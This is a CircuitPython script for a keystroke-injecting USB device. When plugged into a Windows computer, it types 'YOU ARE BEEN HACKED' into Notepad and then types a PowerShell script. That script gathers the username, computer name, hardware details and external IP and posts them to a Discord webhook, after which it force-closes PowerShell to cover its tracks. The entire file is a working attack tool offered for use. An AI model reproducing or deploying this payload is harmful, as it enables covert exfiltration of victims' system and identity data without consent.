# Purpose:
# Minimize all windows, open Notepad, and type "YOU ARE BEEN HACKED"
# Then, use PowerShell to send computer hardware information/IP address via Discord webhook
# Finally, close all PowerShell windows
# !! Note !! This script will automatically switch to another language input method before opening PowerShell, so if you have multiple input methods, it may cause errors.
# Remember to put your own webhook URL in line 65.

import time
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode import Keycode
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.mouse import Mouse

kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(kbd)
mouse = Mouse(usb_hid.devices)

def open(word):
    kbd.send(Keycode.WINDOWS, Keycode.R)
    time.sleep(0.5)
    layout.write(word, delay = 0.1)
    time.sleep(0.5)
    kbd.send(Keycode.ENTER)
    time.sleep(1)

time.sleep(5)

kbd.press(Keycode.WINDOWS)
time.sleep(0.1)
kbd.send(Keycode.D)
time.sleep(0.1)
kbd.release(Keycode.WINDOWS)
time.sleep(0.5)

open("notepad")

kbd.press(Keycode.CONTROL)
time.sleep(0.1)
kbd.send(Keycode.A)
time.sleep(0.1)
kbd.release(Keycode.CONTROL)
time.sleep(0.3)
kbd.send(Keycode.BACKSPACE)
time.sleep(0.5)

kbd.press(Keycode.CONTROL)
time.sleep(0.3)
mouse.move(0, 0, 20) 
time.sleep(0.2)
kbd.release(Keycode.CONTROL)
time.sleep(0.3)
layout.write("YOU ARE BEEN HACKED", delay = 0.1)
time.sleep(0.5)
kbd.press(Keycode.ALT)
time.sleep(0.1)
kbd.send(Keycode.SHIFT)
time.sleep(0.1)
kbd.release(Keycode.ALT)
time.sleep(0.5)

open("powershell")
time.sleep(3)
powershell_script = '''
$webhookUrl = "webhook url"
$externalIp = Invoke-RestMethod -Uri "https://api.ipify.org?format=json"
$gpuInfo = Get-WmiObject -Class Win32_VideoController | ForEach-Object {
    @{
        Name = $_.Name
        AdapterRAM = [math]::round($_.AdapterRAM / 1MB, 2)
        DriverVersion = $_.DriverVersion
    }
}
$deviceInfo = @{
    ComputerName = $env:COMPUTERNAME
    Username = $env:USERNAME
    OS = (Get-WmiObject -Class Win32_OperatingSystem).Caption
    CPU = (Get-WmiObject -Class Win32_Processor).Name
    RamGB = [math]::round((Get-WmiObject -Class Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
    IPAddress = $externalIp.IP
    GPU = $gpuInfo
    HardDrives = Get-WmiObject -Class Win32_DiskDrive | ForEach-Object {
        @{
            Model = $_.Model
            SizeGB = [math]::round($_.Size / 1GB, 2)
        }
    }
    Monitors = Get-WmiObject -Class Win32_DesktopMonitor | ForEach-Object {
        @{
            Name = $_.Name
            ScreenWidth = $_.ScreenWidth
            ScreenHeight = $_.ScreenHeight
        }
    }
}
$deviceInfoFormatted = "DEVICE INFO:`n" +
                       "Computer Name: $($deviceInfo.ComputerName)`n" +
                       "Username: $($deviceInfo.Username)`n" +
                       "OS: $($deviceInfo.OS)`n" +
                       "CPU: $($deviceInfo.CPU)`n" +
                       "RAM (GB): $($deviceInfo.RamGB)`n" +
                       "External IP: $($deviceInfo.IPAddress)`n" +
                       "GPU:`n"
foreach ($gpu in $deviceInfo.GPU) {
    $deviceInfoFormatted += "  - Name: $($gpu.Name), Adapter RAM (MB): $($gpu.AdapterRAM), Driver Version: $($gpu.DriverVersion)`n"
}
$deviceInfoFormatted += "Hard Drives:`n"
foreach ($drive in $deviceInfo.HardDrives) {
    $deviceInfoFormatted += "  - Model: $($drive.Model), Size (GB): $($drive.SizeGB)`n"
}
$deviceInfoFormatted += "Monitors:`n"
foreach ($monitor in $deviceInfo.Monitors) {
    $deviceInfoFormatted += "  - Name: $($monitor.Name), Resolution: ${($monitor.ScreenWidth)}x${($monitor.ScreenHeight)}`n"
}
$deviceInfoMessage = @{
    content = $deviceInfoFormatted
}
$jsonMessage = $deviceInfoMessage | ConvertTo-Json
$response = Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $jsonMessage -ContentType "application/json"
$response
'''
for line in powershell_script.splitlines():
    layout.write(line, delay = 0.04)
    kbd.send(Keycode.ENTER)
    time.sleep(0.3)
time.sleep(1)
layout.write("Get-Process PowerShell | Stop-Process -Force", delay = 0.05)
time.sleep(0.3)
kbd.send(Keycode.ENTER)
